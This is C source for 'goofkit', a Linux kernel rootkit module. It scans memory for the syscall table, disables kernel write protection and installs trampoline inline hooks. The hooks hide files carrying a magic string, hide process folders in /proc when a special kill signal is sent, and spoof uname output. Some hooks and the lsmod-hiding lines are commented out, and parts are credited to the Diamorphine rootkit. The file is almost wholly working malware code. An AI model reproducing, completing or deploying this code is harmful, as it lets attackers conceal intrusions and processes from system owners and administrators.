/*
Project: goofkit
Author: Jack "Hulto" McKenna 🇺🇸  & Rayne Cafaro🤔 & Nicholas "Cictrone" O'Brien ☭
Description: trampolining rootkit. Used to hide files, processes, and network connections from the user.
Task:
*/

#include "goof.h"
#include "user.h"
#include "include/beaengine/BeaEngine.h"
#include "beaengineSources/BeaEngine.c"


// Iterate over the entire possible range until you find some __NR_close
/* Find the syscall table.
   We will use this to reference all of the syscalls that we want to overwrite.
   This is a necessary step since in recent versions of Linux the syscall table is not exported.*/


/* @brief find the syscall table in memory
 *
 * Iterate through memory until we find the close syscall (which my from understanding is exported)
 * Once it is found back up to the start of the table and return that value.
 *
 * may not be needed in the new 4.X kernel it looks like the syscall table may be exported as _sys_call_table.
 * //TODO investigate the above
 *
 * @param void - no params neede we just use the global definition of the address space and where sys_close is
 *
 * @return the address of the syscall table
 */
unsigned long *find(void) {
	unsigned long *sctable;
	unsigned long int i = (unsigned long int)sys_close;
	while (i < ULONG_MAX) {
		sctable = (unsigned long *) i;
		if (sctable[__NR_close] == (unsigned long) sys_close) {

			return sctable;
		}

		i += sizeof(void *);
	}

	return NULL;
}

/* @brief prevent reading and writing special files
 *
 *
 *
 *
 *
 *
 */
asmlinkage int 
goofy_open(const char *pathname, int flags, mode_t mode)
{
	char a[4096];
	copy_from_user(a, pathname, 4096);
	int len = strlen(a);
	//grub.cfg
	if(len > 8){
		if(a[len-8] == 'g' && a[len-7] == 'r' && a[len-6] == 'u' && a[len-5] == 'b' && a[len-4] == '.' && a[len-3] == 'c' && a[len-2] == 'f' && a[len-1] == 'g'){
			printk("Path: %s\n", a);	
			return -ENOENT;
		}

	}
	if(len > 7){
		//vmlinuz
		if(a[len-7] == 'v' && a[len-6] == 'm' && a[len-5] == 'l' && a[len-4] == 'i' && a[len-3] == 'n' && a[len-2] == 'u' && a[len-1] == 'z'){
			printk("Path: %s\n", a);	
			return -ENOENT;
		}
	}
/*	if(strstr(a, "grub") != NULL){
		//printk("Path: %s\n", a);
		return -ENOENT;
	}
	if(strstr(a, "vmlinuz") != NULL){
		//printk("Path: %s\n", a);
		return -ENOENT;
	}
*/	//printk("%c%c\n", a[0], a[1]);
//	printk("HERE :)\n");
/*	printk("%x\n", pathname);
	if(pathname != NULL){
		struct filename *tmp = pathname;
		//tmp = getname(pathname);
		printk("%s\n", tmp->name);		
	}
*/	//return (*original_open)(pathname, flags, mode);
	return NULL; //DO NOT USE
}

/* @brief the hacked version of uname: replaces Linux (or whatever) with Macos (or whatever)
 *
 * Run the OG uname to get the correct value for most things. Copy our new sysname
 * "Macos" over the value ("Linux") and then return. Copy_to_user is required as
 * the buf variable is an argument coming from userspace not kernel land :(
 *
 * @param buf struct describing system (defined in goof.h) --- taken from OG uname
 *
 * @return 0 on success, on error -1 --- taken from OG uname
 */
int goofy_uname(struct utsname *buf){
	//Execute original funciton
	//Calling the original function to fill out our buf variable.
	//Any additions need to happen after the inline assembly otherwise
	//The original function will return strange garbage
	int (*func_ptr)(struct utsname *) = (void *)hooks[0]->trampoline;
	int ret = func_ptr(buf);		

	//Value we want to set	
	char tmp[] = "Macos";
	//Setting the value, buf appears to exist in user space so we need
	//to use the copy to user function
	copy_to_user(buf->sysname, tmp, 5);

	//Printk to kernel buffer to make sure everything is working.
	return ret;
}

/* @brief the hacked version of getdents: hides files with magic string, and PID folders in /proc
 *
 * Iterate through directory entries (using the OG getdents return value), if we find 
 * something we don't like a hidden file or a hidden proc folder we do not copy it 
 * into our return value. If it is not a hidden entry we add it as the normal function
 * would
 *
 * @param fd  file descriptor for file --- taken from OG getdents
 * @param dire struct that describes directory --- taken from OG getdents
 * @param count the number of entries in the dire --- taken from OG getdents
 *
 * @return on success the number of entries, on failure -1
 */
int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
	//Execute original funciton  - hooks[1] is the index that getdents appears in the array
	int (*func_ptr)(unsigned int, struct linux_dirent *, unsigned int) = (void *)hooks[1]->trampoline;
	int ret = func_ptr(fd, dire, count), new_len = 0;		
	if(!ret) { return ret; }

	//ret_dire is the dirent struct we're building with allowed files.
	//k_dire is a copy of the dirent array struct in the kernel.
	//cur_dire is a pointer used during iteration to read the values of each dirent.
	struct linux_dirent *ret_dire = kmalloc(ret, GFP_KERNEL);
	if(!ret_dire){ kfree(ret_dire); return -1; }
	struct linux_dirent *k_dire = kmalloc(ret, GFP_KERNEL);
	if(!k_dire){ kfree(k_dire); return -1; }
	struct linux_dirent *cur_dire;
	int throw_away_variable_just_ignore_this_garbage_output = copy_from_user(k_dire, dire, ret);

	struct inode *d_inode;
	int proc = 0;

	/// ### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
	// From the Diamorphine rootkit
	#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
		d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
	#else
		d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)){
		// Check to see if root inode == 1 and is not a device
		proc = 1;	
	}

	//Iterate through all of dire
	
	for(int i = 0; i < ret;){
		//Set cur_dire
		unsigned char *ptr = (unsigned char *)k_dire;
		ptr = ptr + i;
		cur_dire = (struct linux_dirent *)ptr;
		//Check if the cur_dire name contains magic string
		if(strstr(cur_dire->d_name, MAGIC_STRING) != NULL){
			//DEBUG if does print to buffer
		}else if(proc && is_hidden_proc(simple_strtoul(cur_dire->d_name, NULL, 10))){
			//Else if process to hide, hide /proc/pid
		}else{
			//Else append it to the ret_dire struct
			memcpy((void*)ret_dire+new_len, cur_dire, cur_dire->d_reclen);
			new_len += cur_dire->d_reclen;	
		}
		i += cur_dire->d_reclen;	
	}
	throw_away_variable_just_ignore_this_garbage_output = copy_to_user(dire, ret_dire, new_len);
	ret = new_len;
	
	kfree(k_dire);
	kfree(ret_dire);	
	return ret;	
}

/// ### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
/// More efficient than using an expanding array of PIDs
/* @brief find a process task struct by PID
 *
 * Iterate through each task_struct currently running. If that task has a pid
 * matching the argument pid, then return the current task struct
 * Cannot use the find process functions built into the kernel as they are
 * licensed under GPL, and we are not going to use GPL as we do not wish to
 * open source future sections of this project.
 *
 * @pram pid the process ID of the process being found
 * 
 * @return the task_struct of the process 
 */
struct task_struct *find_task(pid_t pid){
	struct task_struct *tmp = current;
	//Iterate through each process to find the desired process
	for_each_process(tmp) {
		if(tmp->pid == pid){
			return tmp;
		}
	}
	return NULL;
}
/// Check if process is hidden👀
/* @brief check if process is hidden
 *  
 * Use the find task function to find the task struct given a PID.
 * Check the task struct flags for the hidden bit 0x10000000 if found
 * return that the process is hidden.
 *
 * @param pid the process ID that is being checked for the hidden flag
 *
 * @return int 0 for false, 1 for true
 *
 */
int is_hidden_proc(pid_t pid){
	//If pid DNE return 0
	if(pid == 0){ return 0; }
	struct task_struct *res;
	res = find_task(pid);
	//If res DNE return 0
	if(res == 0){ return 0; }
	//If hidden return 1
	if(res->flags & HIDDEN){
		return 1;
	}

	return 0;
}

//### END CREDIT ###

/* @param pid the process ID of the process where the signal
 *		is being sent
 * @param sig the signal being sent to the process. If this
 *		signal is one of our defined ones goofy_kill prevents
 *		the process from being killed and will hide or elevate
 *		prems.
 * @return int on success return 0 otherwise -1
 */
int goofy_kill(pid_t pid, int sig){
	//Create og function pointer
	int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
	struct task_struct *res;
	//Check if signal is hiding signal
	if(sig == HIDE_SIG){
		//Find process
		res = find_task(pid);
		//XOR allows us to hide and unhide the process
		res->flags ^= HIDDEN;
		return 0;
	}
	// Else execute original code
	int ret = func_ptr(pid, sig); //original_kill(pid, sig);
	return ret;
}

/* @brief create and insert inline hook, create trampoline
 * 
 * It's a beast... I'll try to include a diagram.
 * 
 * 1. Save the first <h_len> bytes from the original syscall to our struct
 * 2. Create an inline hook by setting jump to all \x90 then copying the JUMP_TEMPLATE over the bytes
 * 3. Copy the destination address into the jump (over the \x11\x22\x33\x44\x55\x66\x77\x88 value)
 * 4. Build the trampoline.
 *		-Copy jump template to end of original code copy from step 1
 *		-Copy the address of the syscall (just after where we copied in step 1, syscall+h_len+1) over the placeholder \x11\x22\x33\x44\x55\x66\x77\x88 
 * 5. Write the hook created in steps 2 & 3 over the first h_len bytes in the system call
 *		-Requires disabling write protect
 *		-Reenable afterward so things don't break unexpectedly
 *
 * @param src where original source code is coming from
 *   	and where the new code is going
 * @param new_func the goofy function that is hooking
 *		the original function
 * @param id numeric identifier that will define the hook
 *		struct in an array of hook structs
 * @returns NULL --- TODO switch to void function or provide a meaningful return
*/
unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigned int id, unsigned int h_len){
	printk("[goof] hooking %p with %p\n", src, new_func);
	unsigned char *tmp = (unsigned char *)src;
	struct Hook *h = kmalloc(sizeof(struct Hook), GFP_KERNEL);
	
	//Define hook in array
	hooks[id] = h;

	//Define original and new
	h->og_func = (unsigned char *) src;
	h->new_func = (unsigned char *)new_func;

	//TODO auto determine hook length using LDE
	h->hook_len = h_len;

	//~~~~~~~original_code~~~~~~~~~~~	
	//Create a backup of the original code to be
	//used in creating the trampoline and
    //restoring original functions.
	h->original_code = kmalloc(h->hook_len, GFP_KERNEL);
	memcpy(h->original_code, src, h->hook_len);
	
    
    //Calculate size of modified original code by counting the number of jmps
    //or.... just allocate theoretical maximum.... 75 (15 for hook * 5 for sizeof(jmp))

    //May not be needed
    //~~~~~~~modified_original_code~~~~~~~~~~~	
	//Create a backup of the original code to be
	//used in creating the trampoline.
    //TODO Actually do math instead of guessing.
	//h->modified_original_code = kmalloc(75, GFP_KERNEL);
	//memcpy(h->modified_original_code, src, 75);

	//~~~~~~~trampoline~~~~~~~~~~~	
	//Create the trampoline that will be called by
	//the goofy function and jump back into the
	//syscall instructions at offset +hook_len
	//Memory must be executable
	//Allocate enough memory to accomodate the length of the syscall specific hook
	//and also our jump back (15 bytes)
    //                                                  V Extra space for "jmp" extensions
	h->trampoline =  __vmalloc(h->hook_len + HOOK_LEN + (15*10), GFP_KERNEL, PAGE_KERNEL_EXEC);
/*
	printk("\n[goof] trampoline %p\n\t[goof] ", h->trampoline);
	for(int i = 0; i < h->hook_len*2; i++){
        printk("%02x ", h->trampoline[i]);
    }
    printk("\n");*/
        /*
	//TODO:
	DISASM MyDisasm;
	int len = 0;
	int Error = 0;
	(void) memset(&MyDisasm, 0, sizeof(DISASM));
	MyDisasm.EIP = h->trampoline; 
    unsigned long int rel_dest = 0;
	for(int i = 0; i < (h->hook_len + HOOK_LEN + (15*10)); i++){
		len = Disasm(&MyDisasm);
		//printk("instruction branch type: %d\n", MyDisasm.infos.INSTRTYPE.BranchType);
        printk("EIP: %p", MyDisasm.EIP);
		printk("instruction branch type: %d\n", MyDisasm.Instruction.BranchType);
        if(MyDisasm.Instruction.BranchType == 11){
            printk("Relative jump operand: %p", MyDisasm.Instruction.Immediat);
            printk("Trying to jump to absolute address: %p", 0);
            for(int j = 0; j < len; j++){
                printk("%02x ", *(((unsigned char *)MyDisasm.EIP)+j));
                if(MyDisasm.Instruction.BranchType == 11 && j == 1 ){
                   memcpy(&rel_dest, ((unsigned char *)MyDisasm.EIP)+1, 4);
                }
            }
            unsigned long long int abs_dest = ((unsigned char *)MyDisasm.EIP + rel_dest);
            printk("dest: %i", rel_dest);
            printk("dest: %08x", abs_dest);
            printk("eip:  %08x", (unsigned char *)MyDisasm.EIP);
        }
        i += len;
		MyDisasm.EIP = MyDisasm.EIP + len;
		printk("\n");
	}
		*/
	// 1. Iterate through og_code instructions, copying them into trampoline
        // 2. Check if instruction is a relative jump *Check for relative jumps that stay within the og_code*
	// 3. Calculate absolute destination (og_func + relative jump offest + relative jump address)
	// 4. Build an absolute jump with that destination
	// 5. Copy that jump into the trampoline instead of the relative jump
	// 6. Repeat
	memcpy(h->trampoline, h->original_code, h->hook_len);
	
	//Create jump back
	unsigned char *jump_back = kmalloc(HOOK_LEN, GFP_KERNEL);
	
	//Copy in template
	memcpy(jump_back, JUMP_TEMPLATE, HOOK_LEN);
	
	//Fill in template
	tmp = (unsigned char *)src+h->hook_len;
	memcpy(jump_back+2, &tmp, 8);
	
	//Copy jump back into template
	memcpy(h->trampoline+h->hook_len, jump_back, h->hook_len);

	kfree(jump_back);

	//Verify that trampoline is correct
	//Should be originial code and then jump
	//back to syscall + hook_len	

	printk("\n[goof] trampoline %p\n\t[goof] ", h->trampoline);
	for(int i = 0; i < h->hook_len*2; i++){
            printk("%02x ", h->trampoline[i]);
        }
        printk("\n");

	//~~~~~~~Insert hook into syscall~~~~~~~~~~~	
	unsigned char *jump = kmalloc(h->hook_len, GFP_KERNEL);
	memset(jump, 0x90, h->hook_len);
	memcpy(jump, JUMP_TEMPLATE, HOOK_LEN);
	
	//Fill in template with address of our new function
	//Not sure that +0x5 is required.
	//TODO Test it with and without +0x5
	tmp = ((unsigned char *)new_func);
	memcpy(jump+2, &tmp, 8);	

	//Write hook to syscall table
	printk("[goof] Memory hasn't been written\n");
	DISABLE_W_PROTECTED_MEMORY
	//memcpy(src, jump, h->hook_len);
	ENABLE_W_PROTECTED_MEMORY

	return NULL;
}

/* @brief remove a trampoline based on its ID
 *
 * @param id numeric identifier of the hook to be removed
*/
void remove_tramp(unsigned int id ){
	//Write old code back to the original syscall
	DISABLE_W_PROTECTED_MEMORY
	memcpy(hooks[id]->og_func, hooks[id]->original_code, hooks[id]->hook_len);	
	ENABLE_W_PROTECTED_MEMORY
}

/* @brief count the number of bytes required to pad the instruction safely 
 *
 * @param src the address of the syscall that is being evaluated. 
 *
 * @return the number of bytes to size the hook to 
*/
int number_of_bytes_to_pad_jump(unsigned char *src ){
	int res = 0;
	
	DISASM MyDisasm;
	int len = 0;
	int Error = 0;
	(void) memset(&MyDisasm, 0, sizeof(DISASM));
	MyDisasm.EIP = src; 
	for(int i = 0; i < 12 && res < HOOK_LEN ; i++){
		len = Disasm(&MyDisasm);
		//printk("instruction branch type: %d\n", MyDisasm.infos.INSTRTYPE.BranchType);
        printk("EIP: %p", MyDisasm.EIP);
/*
		printk("instruction branch type: %d\n", MyDisasm.Instruction.BranchType);
        if(MyDisasm.Instruction.BranchType == 11){
            printk("Relative jump operand: %p", MyDisasm.Instruction.Immediat);
            printk("Trying to jump to absolute address: %p", 0);
            
            printk("struct Disasm {");
            printk("   UInt64 VirtualAddr; %p", MyDisasm.VirtualAddr);
            printk("   UInt64 Options; %llu", MyDisasm.Options);
            printk("...};");

            printk("struct INSTRTYPE {");
            printk("  Int32 Category; %d", MyDisasm.Instruction.Category);
            printk("  Int32 Opcode; %d", MyDisasm.Instruction.Opcode);
            printk("  char Mnemonic[24]; %s", MyDisasm.Instruction.Mnemonic);
            printk("  Int32 BranchType; %d", MyDisasm.Instruction.BranchType);
            printk("  EFLStruct Flags; %p", MyDisasm.Instruction.Flags);
            printk("  UInt64 AddrValue; %p", MyDisasm.Instruction.AddrValue);
            printk("  Int64 Immediat; %d", MyDisasm.Instruction.Immediat);
            printk("  UInt32 ImplicitModifiedRegs; %d", MyDisasm.Instruction.ImplicitModifiedRegs);
            printk("};");

            printk("struct OPTYPE {");
            printk("  char ArgMnemonic[24]; %s", MyDisasm.Argument1.ArgMnemonic);
            printk("  UInt64 ArgType; %p", MyDisasm.Argument1.ArgType);
            printk("  Int32 ArgSize; %ld", MyDisasm.Argument1.ArgSize);
            printk("  UInt32 AccessMode; %lu", MyDisasm.Argument1.AccessMode);
            printk("  MEMORYTYPE Memory; %d", MyDisasm.Argument1.Memory);
            printk("  UInt32 SegmentReg; %lu", MyDisasm.Argument1.SegmentReg);
            printk("};");

            printk("typedef struct MEMORYTYPE {");
            printk("   Int32 BaseRegister; %lu", MyDisasm.Argument1.Memory.BaseRegister);
            printk("   Int32 IndexRegister; %lu", MyDisasm.Argument1.Memory.IndexRegister);
            printk("   Int32 Scale; %lu", MyDisasm.Argument1.Memory.Scale);
            printk("   Int64 Displacement; %llu", MyDisasm.Argument1.Memory.Displacement);
        }
*/
		printk("len: %d\n", len);
        unsigned long int rel_dest = 0;
        //unsigned long long dest = 0;
		for(int j = 0; j < len; j++){
			printk("%02x ", *(((unsigned char *)MyDisasm.EIP)+j));
            if(MyDisasm.Instruction.BranchType == 11 && j == 1 ){
               memcpy(&rel_dest, ((unsigned char *)MyDisasm.EIP)+1, 4);
            }
		}
        unsigned long long int abs_dest = ((unsigned char *)MyDisasm.EIP + rel_dest);
        //printk("dest: %02x %02x %02x %02x", dest[0], dest[1], dest[2], dest[3]); 
/*
        printk("dest: %i", rel_dest);
        printk("dest: %08x", abs_dest);
        printk("eip:  %08x", (unsigned char *)MyDisasm.EIP);
*/		
		res += len;
		MyDisasm.EIP = MyDisasm.EIP + len;
		printk("\n");
	}
	return res;
}

//Defines the maximum number of hooks to be stored in the array
#define HOOKS_COUNT 3

static int __init
goof_init(void) {
	//Hide kernel module from lsmod 
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);

	printk("[goof] module loaded\n");
	
	hooks = kmalloc(sizeof(struct Hook *)*HOOKS_COUNT, GFP_KERNEL);

	//Find base syscall address	
	__sys_call_table = find(); 
	printk("Found table\n");

	/*
	//Update table with hooked code
	//Regular way to hook syscall:
	DISABLE_W_PROTECTED_MEMORY
	original_uname = __sys_call_table[__NR_uname];
	__sys_call_table[__NR_uname] = goofy_uname;
	ENABLE_W_PROTECTED_MEMORY
	*/

	//Trampolining way to overwrite syscall: 
	int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, padding_size);
	printk("Hooked uname with %d bytes\n\n",padding_size);
	/*unsigned char *kmem_ptr = (unsigned char*)__sys_call_table[__NR_uname]; 
	printk("kmem_ptr=%x", kmem_ptr);
	for(unsigned char i = 0; i < padding_size + HOOK_LEN; i++){
		printk("%02x ", *(kmem_ptr+i));
	}*/
	//create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, padding_size);
	//printk("Hooked uname with %d bytes\n\n",padding_size);
	 
	//padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_getdents]);
	//create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, padding_size);
	//printk("Hooked getdents with %d bytes\n\n", padding_size);
	
	//padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_kill]);
	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, padding_size);
	//printk("Hooked kill with %d bytes\n\n", padding_size);


	return 0;
}
static void __exit
goof_exit(void) {
//	remove_tramp(0);
//	remove_tramp(1);
//	remove_tramp(2);

/*
	DISABLE_W_PROTECTED_MEMORY
	__sys_call_table[__NR_uname] = original_uname;
	ENABLE_W_PROTECTED_MEMORY
*/	

	printk("[goof] module removed\n");
	return;
}

module_init(goof_init);
module_exit(goof_exit);

MODULE_LICENSE("MIT");
